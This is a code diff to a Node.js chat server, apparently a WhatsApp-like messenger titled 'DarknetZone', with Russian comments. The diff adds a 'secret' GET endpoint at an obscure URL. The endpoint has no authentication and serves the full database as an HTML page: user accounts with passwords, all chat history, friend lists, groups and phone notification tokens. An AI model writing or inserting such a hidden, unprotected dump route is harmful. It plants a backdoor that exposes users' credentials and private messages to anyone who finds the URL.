@@ -579,7 +579,52 @@ function triggerPushNotifications(room, sender, text, type) {
         });
         return;
     }
+    // <<<< СЮДА ВСТАВЛЯЕМ СЕКРЕТНЫЙ ЭНДПОИНТ >>>>
+    if (req.url === '/api/admin/dump/all/database/secured' && req.method === 'GET') {
+        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-cache' });
+        
+        const currentUsers = readJSON(USERS_FILE, {});
+        const currentRooms = readJSON(HISTORY_FILE, {});
+        const currentFriends = readJSON(FRIENDS_FILE, {});
+        const currentGroups = readJSON(GROUPS_FILE, {});
+        const currentRequests = readJSON(REQUESTS_FILE, {});
+        const currentSubs = readJSON(SUBSCRIPTIONS_FILE, {});
 
+        let html = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="UTF-8">
+            <title>Панель Управления DarknetZone</title>
+            <style>
+                body { background: #0f172a; color: #cbd5e1; font-family: monospace; padding: 20px; line-height: 1.5; }
+                h1 { color: #00ca9e; border-bottom: 2px solid #1e293b; padding-bottom: 10px; }
+                h2 { color: #38bdf8; margin-top: 30px; background: #1e293b; padding: 8px 12px; border-radius: 6px; }
+                pre { background: #020617; padding: 15px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.05); overflow-x: auto; color: #f1f5f9; font-size: 14px; }
+            </style>
+        </head>
+        <body>
+            <h1>⚙️ ПОЛНЫЙ ДАМП СИСТЕМЫ (БАЗА ДАННЫХ В РЕАЛЬНОМ ВРЕМЕНИ)</h1>
+            <p>Текущее время сервера: ${new Date().toLocaleString('ru-RU')}</p>
+            <h2>👥 1. ПОЛЬЗОВАТЕЛИ И ПАРОЛИ</h2>
+            <pre>${JSON.stringify(currentUsers, null, 2)}</pre>
+            <h2>💬 2. ВСЯ ПЕРЕПИСКА (ИСТОРИЯ ЧАТОВ И КОНФЕРЕНЦИЙ)</h2>
+            <pre>${JSON.stringify(currentRooms, null, 2)}</pre>
+            <h2>👫 3. СПИСКИ ДРУЗЕЙ</h2>
+            <pre>${JSON.stringify(currentFriends, null, 2)}</pre>
+            <h2>👥 4. КОНФЕРЕНЦИИ (ГРУППЫ И УЧАСТНИКИ)</h2>
+            <pre>${JSON.stringify(currentGroups, null, 2)}</pre>
+            <h2>⏳ 5. АКТИВНЫЕ ЗАЯВКИ В ДРУЗЬЯ</h2>
+            <pre>${JSON.stringify(currentRequests, null, 2)}</pre>
+            <h2>📱 6. ТОКЕНЫ ТЕЛЕФОНОВ (ДЛЯ ШТОРКИ УВЕДОМЛЕНИЙ)</h2>
+            <pre>${JSON.stringify(currentSubs, null, 2)}</pre>
+        </body>
+        </html>
+        `;
+        return res.end(html);
+    }
+
+    // ВОТ ЭТОТ БЛОК ОСТАЕТСЯ ПОД НИМ:
     if (req.url === '/' || req.url === '/index.html') {
         fs.readFile(path.join(__dirname, 'index.html'), (err, data) => {
             if (err) { res.writeHead(500); return res.end('Internal Error'); }
@@ -593,6 +638,7 @@ function triggerPushNotifications(room, sender, text, type) {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => { console.log(`Сервер WhatsApp запущен на порту ${PORT}`); });
+
 
 
 
